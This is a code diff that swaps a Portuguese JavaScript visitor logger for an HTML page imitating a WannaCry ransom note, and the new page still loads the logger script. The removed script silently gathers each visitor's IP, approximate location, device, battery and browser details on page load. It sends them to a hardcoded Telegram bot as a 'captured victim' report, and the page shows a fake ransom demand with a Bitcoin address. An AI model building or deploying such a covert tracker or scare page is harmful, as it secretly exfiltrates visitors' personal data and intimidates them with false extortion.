@@ -1,270 +1,442 @@
-// ============================================
-// IP LOGGER + TELEGRAM (SEM PEDIR PERMISSÃO)
-// ============================================
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Ooops, your files have been encrypted!</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
 
-const BOT_TOKEN = "8819910333:AAGxrE0I0KQy4DJtmJg5sGIWQqYBfOpPb1w";
-const CHAT_ID = "8551438856";
-
-// ============================================
-// 1. PEGAR IP
-// ============================================
-async function getIP() {
-    try {
-        const response = await fetch('https://api.ipify.org?format=json');
-        const data = await response.json();
-        return data.ip;
-    } catch {
-        return 'Não foi possível obter IP';
-    }
-}
-
-// ============================================
-// 2. PEGAR LOCALIZAÇÃO PELO IP (sem permissão)
-// ============================================
-async function getLocationByIP(ip) {
-    try {
-        const response = await fetch(`https://ipinfo.io/${ip}/json`);
-        const data = await response.json();
-        return {
-            city: data.city || 'Desconhecida',
-            region: data.region || 'Desconhecida',
-            country: data.country || 'Desconhecido',
-            loc: data.loc || 'Desconhecida',
-            org: data.org || 'Desconhecido',
-            timezone: data.timezone || 'Desconhecido'
-        };
-    } catch {
-        return {
-            city: 'Erro ao obter',
-            region: 'Erro ao obter',
-            country: 'Erro ao obter',
-            loc: 'Erro ao obter',
-            org: 'Erro ao obter',
-            timezone: 'Erro ao obter'
-        };
-    }
-}
-
-// ============================================
-// 3. DADOS DO NAVEGADOR/DISPOSITIVO
-// ============================================
-function getBrowserData() {
-    const data = {
-        userAgent: navigator.userAgent,
-        platform: navigator.platform,
-        language: navigator.language,
-        screenWidth: screen.width,
-        screenHeight: screen.height,
-        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-        referrer: document.referrer || 'Direto',
-        url: window.location.href,
-        timestamp: new Date().toLocaleString('pt-BR')
-    };
-    return data;
-}
-
-// ============================================
-// 4. DETECTAR VPN/PROXY
-// ============================================
-function detectVPN(ipInfo) {
-    if (!ipInfo || !ipInfo.org) return '❓ Não foi possível detectar';
-    const org = ipInfo.org.toLowerCase();
-    if (org.includes('vpn') || org.includes('proxy') || org.includes('cloudflare') || org.includes('amazon') || org.includes('digitalocean')) {
-        return '⚠️ **Possível VPN/Proxy detectado!**';
-    }
-    return '✅ Nenhum VPN/Proxy detectado';
-}
-
-// ============================================
-// 5. INFORMAÇÕES DO SMARTPHONE (sem permissão)
-// ============================================
-function getSmartphoneInfo() {
-    const ua = navigator.userAgent;
-    const isMobile = /Mobi|Android|iPhone|iPad|iPod/i.test(ua);
-    const isIOS = /iPhone|iPad|iPod/i.test(ua);
-    const isAndroid = /Android/i.test(ua);
-    const isWindows = /Windows Phone/i.test(ua);
-
-    let model = 'Desconhecido';
-    let osVersion = 'Desconhecida';
-    let brand = 'Desconhecida';
-
-    if (isIOS) {
-        const match = ua.match(/iPhone OS (\d+)_(\d+)/);
-        if (match) {
-            model = 'iPhone';
-            osVersion = `iOS ${match[1]}.${match[2]}`;
-        } else {
-            model = 'iPhone';
-            osVersion = 'iOS desconhecido';
+        body {
+            background: #0a0a2a;
+            font-family: 'Courier New', monospace;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
         }
-        brand = 'Apple';
-    } else if (isAndroid) {
-        const match = ua.match(/Android (\d+\.\d+)/);
-        if (match) {
-            model = 'Android';
-            osVersion = `Android ${match[1]}`;
-        } else {
-            model = 'Android';
-            osVersion = 'Android desconhecido';
+
+        .container {
+            max-width: 820px;
+            width: 100%;
+            background: #0d0d2b;
+            border: 2px solid #ff0000;
+            border-radius: 6px;
+            padding: 25px 30px 20px;
+            box-shadow: 0 0 60px rgba(255, 0, 0, 0.15);
+            position: relative;
+            overflow: hidden;
         }
-        brand = 'Vários (Android)';
-    } else if (isWindows) {
-        model = 'Windows Phone';
-        osVersion = 'Windows Phone';
-        brand = 'Microsoft';
-    } else if (!isMobile) {
-        model = '💻 Computador (não é smartphone)';
-        osVersion = navigator.platform || 'Desconhecido';
-        brand = 'Desktop';
-    }
 
-    // Bateria (se disponível - pode pedir permissão em alguns navegadores)
-    let battery = '❌ Não disponível';
-    if (navigator.getBattery) {
-        try {
-            navigator.getBattery().then(bat => {
-                const level = Math.round(bat.level * 100);
-                const charging = bat.charging ? '⚡ Carregando' : '🔋 Descarregando';
-                battery = `${level}% (${charging})`;
-            }).catch(() => {});
-        } catch (e) {}
-    }
-
-    // Rede (sem permissão)
-    let connectionType = 'N/A';
-    let carrier = '❌ Não disponível';
-    if (navigator.connection) {
-        connectionType = navigator.connection.effectiveType || 'N/A';
-        if (navigator.connection.type) {
-            carrier = `Tipo: ${navigator.connection.type}`;
+        .container::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: repeating-linear-gradient(0deg, transparent, transparent 2px, rgba(255, 0, 0, 0.025) 2px, rgba(255, 0, 0, 0.025) 4px);
+            pointer-events: none;
+            animation: scan 10s linear infinite;
         }
-    }
 
-    return {
-        isMobile,
-        model,
-        brand,
-        osVersion,
-        battery,
-        carrier,
-        connectionType,
-        deviceMemory: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'N/A',
-        cores: navigator.hardwareConcurrency || 'N/A'
-    };
-}
-
-// ============================================
-// 6. ENVIAR TUDO PRO TELEGRAM
-// ============================================
-async function sendToTelegram(ip, location, browserData, smartphone, vpnStatus) {
-    let message = `
-🕵️‍♂️ **NOVA VÍTIMA CAPTURADA** 💀
-
-🌐 **IP:** ${ip}
-
-📍 **LOCALIZAÇÃO (por IP):**
-   ───────────────────────────
-   🏙️ **Cidade:** ${location.city}
-   🗺️ **Região:** ${location.region}
-   🌍 **País:** ${location.country}
-   📍 **Coordenadas:** ${location.loc}
-   🕰️ **Fuso Horário:** ${location.timezone}
-   ───────────────────────────
-
-📱 **SMARTPHONE/DISPOSITIVO:**
-   ───────────────────────────
-   📱 **Modelo:** ${smartphone.model}
-   🏷️ **Marca:** ${smartphone.brand}
-   📲 **Sistema:** ${smartphone.osVersion}
-   🔋 **Bateria:** ${smartphone.battery}
-   📶 **Conexão:** ${smartphone.connectionType}
-   💾 **Memória RAM:** ${smartphone.deviceMemory}
-   🧠 **Núcleos:** ${smartphone.cores}
-   ───────────────────────────
-
-📊 **DADOS DO NAVEGADOR:**
-   ───────────────────────────
-   🖥️ **User Agent:** ${browserData.userAgent}
-   📐 **Tela:** ${browserData.screenWidth}x${browserData.screenHeight}px
-   🌍 **Idioma:** ${browserData.language}
-   🔗 **Referer:** ${browserData.referrer}
-   📎 **URL:** ${browserData.url}
-   ⏱️ **Data/Hora:** ${browserData.timestamp}
-   ───────────────────────────
-
-🛡️ **VPN/PROXY:** ${vpnStatus}
-   ───────────────────────────
-
-💀 **Ransomware WannaCry Style - IP Logger**
-`;
-
-    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-
-    try {
-        const response = await fetch(url, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                chat_id: CHAT_ID,
-                text: message,
-                parse_mode: 'Markdown',
-                disable_web_page_preview: true
-            })
-        });
-        if (response.ok) {
-            document.getElementById('status').textContent = '✅ Decryption key sent!';
-            document.getElementById('status').style.color = '#00ff41';
-        } else {
-            document.getElementById('status').textContent = '❌ Failed to connect';
-            document.getElementById('status').style.color = '#ff0000';
+        @keyframes scan {
+            0% { transform: translateY(-100%); }
+            100% { transform: translateY(100%); }
         }
-    } catch {
-        document.getElementById('status').textContent = '❌ Network error';
-        document.getElementById('status').style.color = '#ff0000';
-    }
-}
 
-// ============================================
-// 7. FUNÇÃO PRINCIPAL
-// ============================================
-async function main() {
-    const loading = document.getElementById('loading');
-    const status = document.getElementById('status');
+        .header {
+            text-align: center;
+            border-bottom: 2px solid #ff0000;
+            padding-bottom: 12px;
+            margin-bottom: 18px;
+            position: relative;
+            z-index: 1;
+        }
 
-    loading.style.display = 'block';
-    status.textContent = '📡 Coletando dados do sistema...';
+        .header h1 {
+            color: #ff0000;
+            font-size: 26px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            text-shadow: 0 0 20px rgba(255, 0, 0, 0.3);
+            animation: blink 1.2s step-end infinite;
+            font-weight: normal;
+        }
 
-    const ip = await getIP();
-    const location = await getLocationByIP(ip);
-    const browserData = getBrowserData();
-    const smartphone = getSmartphoneInfo();
-    const vpnStatus = detectVPN(location);
+        @keyframes blink {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.2; }
+        }
 
-    status.textContent = '📤 Enviando para o servidor...';
-    await sendToTelegram(ip, location, browserData, smartphone, vpnStatus);
+        .header .subtitle {
+            color: #ff4444;
+            font-size: 13px;
+            margin-top: 4px;
+            letter-spacing: 1px;
+        }
 
-    setTimeout(() => {
-        loading.style.display = 'none';
-    }, 4000);
-}
+        .content {
+            color: #00ff41;
+            font-size: 13.5px;
+            line-height: 1.7;
+            position: relative;
+            z-index: 1;
+        }
 
-// ============================================
-// 8. BOTÕES (troll)
-// ============================================
-function checkPayment() {
-    alert('💰 Payment not detected!\n\nTry sending exactly $300 in Bitcoin to:\n1T5p7UMMngoj1plMvkpHjicRdfJNXj8LrLn');
-}
+        .content h2 {
+            color: #ffcc00;
+            font-size: 17px;
+            margin: 16px 0 8px 0;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            font-weight: normal;
+        }
 
-function decrypt() {
-    alert('🔓 Decrypting files...\n\nJust kidding! 😂\nYour IP and location were sent to the owner! 👀');
-}
+        .content p {
+            margin-bottom: 8px;
+            color: #cccccc;
+        }
 
-function aboutBitcoin() {
-    alert('₿ Bitcoin is a cryptocurrency.\n\nCurrent price: ~$60,000 USD');
-}
+        .content .highlight {
+            color: #ffcc00;
+            font-weight: bold;
+        }
 
-// ============================================
-// 9. EXECUTAR
-// ============================================
-document.addEventListener('DOMContentLoaded', main);
+        .content .red {
+            color: #ff0000;
+            font-weight: bold;
+        }
+
+        .status-bar {
+            background: #1a1a3a;
+            padding: 10px 14px;
+            border-radius: 3px;
+            margin: 12px 0 16px 0;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            border-left: 3px solid #ff0000;
+            position: relative;
+            z-index: 1;
+        }
+
+        .status-bar .dot {
+            width: 10px;
+            height: 10px;
+            border-radius: 50%;
+            background: #ff0000;
+            animation: pulse 0.8s ease-in-out infinite;
+            flex-shrink: 0;
+        }
+
+        @keyframes pulse {
+            0%, 100% { opacity: 1; transform: scale(1); }
+            50% { opacity: 0.2; transform: scale(0.7); }
+        }
+
+        .status-bar .text {
+            color: #ff4444;
+            font-size: 13px;
+            flex: 1;
+        }
+
+        .status-bar .text .highlight {
+            color: #ffcc00;
+        }
+
+        .bitcoin-address {
+            background: #111133;
+            border: 1px solid #ffcc00;
+            padding: 14px;
+            margin: 14px 0;
+            text-align: center;
+            border-radius: 3px;
+        }
+
+        .bitcoin-address .label {
+            color: #888;
+            font-size: 12px;
+            display: block;
+            margin-bottom: 4px;
+        }
+
+        .bitcoin-address .address {
+            color: #ffcc00;
+            font-size: 19px;
+            font-weight: bold;
+            letter-spacing: 1.5px;
+            word-break: break-all;
+            font-family: 'Courier New', monospace;
+        }
+
+        .bitcoin-address .small {
+            margin-top: 6px;
+            font-size: 10px;
+            color: #555;
+        }
+
+        .buttons {
+            display: flex;
+            gap: 12px;
+            margin: 18px 0 10px 0;
+            flex-wrap: wrap;
+            position: relative;
+            z-index: 1;
+        }
+
+        .btn {
+            flex: 1;
+            min-width: 110px;
+            padding: 11px 16px;
+            border: 2px solid #00ff41;
+            background: transparent;
+            color: #00ff41;
+            font-family: 'Courier New', monospace;
+            font-size: 13px;
+            font-weight: bold;
+            text-transform: uppercase;
+            cursor: pointer;
+            transition: all 0.25s;
+            text-align: center;
+            border-radius: 3px;
+            text-decoration: none;
+            letter-spacing: 0.5px;
+        }
+
+        .btn:hover {
+            background: #00ff41;
+            color: #0d0d2b;
+            box-shadow: 0 0 35px rgba(0, 255, 65, 0.2);
+        }
+
+        .btn-danger {
+            border-color: #ff0000;
+            color: #ff0000;
+        }
+
+        .btn-danger:hover {
+            background: #ff0000;
+            color: #0d0d2b;
+            box-shadow: 0 0 35px rgba(255, 0, 0, 0.2);
+        }
+
+        .btn-warning {
+            border-color: #ffcc00;
+            color: #ffcc00;
+        }
+
+        .btn-warning:hover {
+            background: #ffcc00;
+            color: #0d0d2b;
+            box-shadow: 0 0 35px rgba(255, 204, 0, 0.2);
+        }
+
+        .footer {
+            margin-top: 18px;
+            padding-top: 12px;
+            border-top: 1px solid #222244;
+            display: flex;
+            justify-content: space-between;
+            font-size: 11px;
+            color: #555;
+            position: relative;
+            z-index: 1;
+            flex-wrap: wrap;
+            gap: 5px;
+        }
+
+        .footer a {
+            color: #666;
+            text-decoration: none;
+            cursor: pointer;
+        }
+
+        .footer a:hover {
+            color: #00ff41;
+        }
+
+        /* ─── TROLL FACE LOADING ─── */
+        #loading {
+            display: none;
+            text-align: center;
+            padding: 20px 10px;
+            margin: 10px 0;
+            color: #00ff41;
+            font-size: 15px;
+            background: rgba(0, 0, 0, 0.3);
+            border-radius: 3px;
+            border: 1px solid #00ff41;
+            position: relative;
+            z-index: 1;
+        }
+
+        #loading .troll-spinner {
+            font-size: 70px;
+            display: inline-block;
+            animation: spin 1.2s linear infinite;
+            margin-bottom: 10px;
+            filter: drop-shadow(0 0 20px rgba(255,255,255,0.3));
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg) scale(1); }
+            50% { transform: rotate(180deg) scale(1.2); }
+            100% { transform: rotate(360deg) scale(1); }
+        }
+
+        #status {
+            color: #00ff41;
+            font-size: 14px;
+        }
+
+        /* ─── TROLL FACE GIGANTE QUE APARECE E SOME ─── */
+        .troll-bg {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-size: 300px;
+            opacity: 0;
+            pointer-events: none;
+            z-index: 9999;
+            animation: trollAppear 4s ease-in-out forwards;
+            text-shadow: 0 0 100px rgba(255,255,255,0.2);
+            font-family: Arial;
+            user-select: none;
+        }
+
+        @keyframes trollAppear {
+            0% { opacity: 0; transform: scale(0.5) rotate(-10deg); }
+            20% { opacity: 0.9; transform: scale(1.2) rotate(5deg); }
+            40% { opacity: 1; transform: scale(1) rotate(0deg); }
+            70% { opacity: 0.8; }
+            100% { opacity: 0; transform: scale(1.5) rotate(10deg); }
+        }
+
+        /* ─── TROLL FACE PISCANDO NO FUNDO ─── */
+        .troll-fixed {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            font-size: 40px;
+            opacity: 0.15;
+            z-index: 0;
+            animation: trollPulse 3s ease-in-out infinite;
+            pointer-events: none;
+        }
+
+        @keyframes trollPulse {
+            0%, 100% { opacity: 0.1; transform: scale(1); }
+            50% { opacity: 0.3; transform: scale(1.2); }
+        }
+
+        @media (max-width: 600px) {
+            .container { padding: 14px 16px; }
+            .header h1 { font-size: 17px; }
+            .content { font-size: 12px; }
+            .buttons { flex-direction: column; }
+            .btn { min-width: 100%; }
+            .bitcoin-address .address { font-size: 14px; }
+            .header .subtitle { font-size: 11px; }
+            .status-bar .text { font-size: 11px; }
+            .troll-bg { font-size: 150px; }
+            .troll-fixed { font-size: 25px; }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- TROLL FACE GIGANTE QUE APARECE E SOME -->
+    <div class="troll-bg">🗿</div>
+
+    <!-- TROLL FACE FIXO NO CANTO -->
+    <div class="troll-fixed">🗿</div>
+
+    <div class="container">
+        <div class="header">
+            <h1>⚠️ Ooops, your files have been encrypted!</h1>
+            <div class="subtitle">🔐 Your documents, photos, videos and databases are locked</div>
+        </div>
+
+        <div class="content">
+
+            <div class="status-bar">
+                <div class="dot"></div>
+                <div class="text">
+                    <span class="highlight">[!]</span> Your system has been compromised.
+                    <span class="highlight">All files are encrypted</span> with AES-256.
+                </div>
+            </div>
+
+            <h2>💀 What Happened to My Computer?</h2>
+            <p>
+                Your important files are encrypted. Many of your documents, photos, videos,
+                databases and other files are no longer accessible because they have been encrypted.
+                Maybe you are busy looking for a way to recover your files, but do not waste your time.
+                <span class="red">Nobody can recover your files without our decryption service.</span>
+            </p>
+
+            <h2>💰 Can I Recover My Files?</h2>
+            <p>
+                Sure. We guarantee that you can recover all your files safely and easily.
+                But you have not so enough time.
+            </p>
+            <p>
+                You can decrypt some of your files for free. Try now by clicking <span class="highlight">[Decrypt]</span>.
+                But if you want to decrypt all your files, you need to pay.
+            </p>
+            <p class="red">
+                ⏰ You only have <span class="highlight">3 days</span> to submit the payment.
+                After that the price will be doubled. Also, if you don't pay in <span class="highlight">7 days</span>,
+                you won't be able to recover your files forever.
+            </p>
+            <p>
+                We will have free events for users who are so poor that they couldn't pay in 6 months.
+            </p>
+
+            <h2>💸 How Do I Pay?</h2>
+            <p>
+                Payment is accepted in <span class="highlight">Bitcoin</span> only.
+                For more information, click <span class="highlight">&lt;About bitcoin&gt;</span>.
+                Please check the current price of Bitcoin and buy some bitcoins.
+                For more information, click <span class="highlight">&lt;How to buy bitcoins&gt;</span>.
+                And send the correct amount to the address specified in this window.
+                After your payment, click <span class="highlight">&lt;Check Payment&gt;</span>.
+                Best time to check: 9:00am - 11:00am.
+            </p>
+
+            <div class="bitcoin-address">
+                <span class="label">📤 Send $300 worth of bitcoin to this address:</span>
+                <div class="address">1T5p7UMMngoj1plMvkpHjicRdfJNXj8LrLn</div>
+                <span class="small">⏱️ Best time to check: 9:00am - 11:00am</span>
+            </div>
+
+            <div class="buttons">
+                <button class="btn btn-warning" onclick="checkPayment()">💰 Check Payment</button>
+                <button class="btn btn-danger" onclick="decrypt()">🔓 Decrypt</button>
+                <button class="btn" onclick="aboutBitcoin()">₿ About bitcoin</button>
+            </div>
+
+            <!-- LOADING COM TROLL FACE GIRANDO -->
+            <div id="loading">
+                <div class="troll-spinner">🗿</div>
+                <div id="status">🧠 Coletando dados do sistema...</div>
+            </div>
+
+        </div>
+
+        <div class="footer">
+            <span>🔒 Ransomware | Matheus Mancio 🗿</span>
+            <span><a href="#" onclick="alert('🗿 TROLL FACE!\n\nVocê foi trolado! ( ͡° ͜ʖ ͡°)')">📧 Contact Support</a></span>
+        </div>
+    </div>
+
+    <script src="logger.js"></script>
+</body>
+</html>
